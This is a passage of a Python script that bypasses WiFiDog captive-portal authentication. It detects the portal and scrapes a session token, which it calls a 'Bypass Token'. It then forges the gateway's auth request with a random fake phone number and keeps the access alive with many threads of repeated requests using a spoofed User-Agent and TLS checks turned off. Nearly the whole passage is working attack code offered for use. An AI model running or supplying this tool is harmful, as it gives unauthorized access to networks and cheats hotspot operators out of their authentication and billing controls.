# ===============================
def check_real_internet():
    try:
        requests.get("http://www.google.com", timeout=3)
        return True
    except:
        return False

def high_speed_ping(auth_link, sid):
    session = requests.Session()
    headers = {'User-Agent': 'Mozilla/5.0 Chrome/120.0.0.0 Safari/537.36'}
    while not stop_event.is_set():
        try:
            session.get(auth_link, headers=headers, timeout=5, verify=False)
            print(f"{GREEN}[✓]{RESET} SID: {sid[:8]}... | Pulse Active 🔥   ", end="\r")
        except:
            break
        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))

# ===============================
# MAIN ENGINE
# ===============================
def start_engine():
    logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(message)s", datefmt="%H:%M:%S")
    logging.info(f"{CYAN}System Initializing...{RESET}")

    while not stop_event.is_set():
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"

        try:
            r = requests.get(test_url, allow_redirects=True, timeout=10)

            if r.url == test_url:
                if check_real_internet():
                    print(f"{YELLOW}[•]{RESET} Status: Online & Stable. Monitoring... ", end="\r")
                    time.sleep(5)
                    continue

            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"

            print(f"\n{CYAN}[!] Captive Portal Found: {portal_host}{RESET}")

            res_portal = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", res_portal.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            
            res_final = session.get(next_url, verify=False, timeout=10)
            sid = parse_qs(urlparse(res_final.url).query).get('sessionId', [None])[0]
            
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9\-]+)', res_final.text)
                sid = sid_match.group(1) if sid_match else None

            if sid:
                print(f"{GREEN}[✓]{RESET} Bypass Token Acquired: {sid}")
                params = parse_qs(parsed_portal.query)
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]

                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber={random.randint(10000,99999)}"

                print(f"{MAGENTA}[*] Engaging Turbo Threads ({PING_THREADS})...{RESET}")
                for _ in range(PING_THREADS):
                    threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()

                while check_real_internet():
                    time.sleep(10)
                    if stop_event.is_set(): break
            else:
                time.sleep(3)

        except Exception as e:
            time.sleep(5)

